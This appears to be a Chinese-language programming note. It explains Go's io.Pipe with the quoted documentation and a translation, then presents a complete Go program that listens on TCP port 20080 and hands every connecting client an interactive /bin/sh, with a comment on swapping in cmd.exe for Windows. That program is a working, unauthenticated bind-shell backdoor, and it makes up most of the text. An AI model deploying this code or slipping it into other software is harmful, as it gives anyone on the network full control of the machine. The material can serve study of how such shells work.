package io // import "io"
​
func Pipe() (*PipeReader, *PipeWriter)
    Pipe creates a synchronous in-memory pipe. It can be used to connect code
    expecting an io.Reader with code expecting an io.Writer.
​
    Reads and Writes on the pipe are matched one to one except when multiple
    Reads are needed to consume a single Write. That is, each Write to the
    PipeWriter blocks until it has satisfied one or more Reads from the
    PipeReader that fully consume the written data. The data is copied directly
    from the Write to the corresponding Read (or Reads); there is no internal
    buffering.
​
    It is safe to call Read and Write in parallel with each other or with Close.
    Parallel calls to Read and parallel calls to Write are also safe: the
    individual calls will be gated sequentially.
#管道创建一个同步的内存管道。 它可以用来连接代码期望io.Reader以及期望io.Writer的代码。管道上的读取和写入一对一匹配，除非多个需要读取才能消耗一次Write。 也就是说，每个写入PipeWriter会阻塞，直到它满足来自以下方面的一项或多项读取：完全消耗已写入数据的PipeReader。 数据直接复制从写入到相应的读取（或多个读取）； 没有内部缓冲。

这是linux的实现。

由于Windows 对匿名管道有特殊处理，我们需要调用一下io.pipe，来创建一个同步的内存管道。

x
func handle(conn net.Conn) {
    cmd := exec.Command("/bin/sh", "-i")
    rp, wp := io.Pipe()
    cmd.Stdin = conn
    cmd.Stdout = wp
    go io.Copy(conn, rp)
    cmd.Run()
    conn.Close()
}

调用 io.Pipe() 创建了同步连接的 reader 和 writer —— 任何写入到 writer（即 wp ） 的数据都会被 reader (rp) 读取。因此，将 writer 赋值给 cmd.Stdout ，然后使用 Copy(Writer, Reader) 将 PipeReader 连接到 TCP 的链接。使用 goroutine 防止代码阻塞。命令的任何标准输出都将发送到 writer ，然后通过管道将 reader 的输出传送到TCP的链接。

package main
​
import (
    "io"
    "log"
    "net"
    "os/exec"
)
​
func handle(conn net.Conn) {
​
    /*
     * Explicitly calling /bin/sh and using -i for interactive mode
     * so that we can use it for stdin and stdout.
     * For Windows use exec.Command("cmd.exe")
     */
    // cmd := exec.Command("cmd.exe")
    cmd := exec.Command("/bin/sh", "-i")
    rp, wp := io.Pipe()
    // Set stdin to our connection
    cmd.Stdin = conn
    cmd.Stdout = wp
    go io.Copy(conn, rp)
    cmd.Run()
    conn.Close()
}
​
func main() {
    listener, err := net.Listen("tcp", ":20080")
    if err != nil {
        log.Fatalln(err)
    }
​
    for {
        conn, err := listener.Accept()
        if err != nil {
            log.Fatalln(err)
        }
        go handle(conn)
    }
}
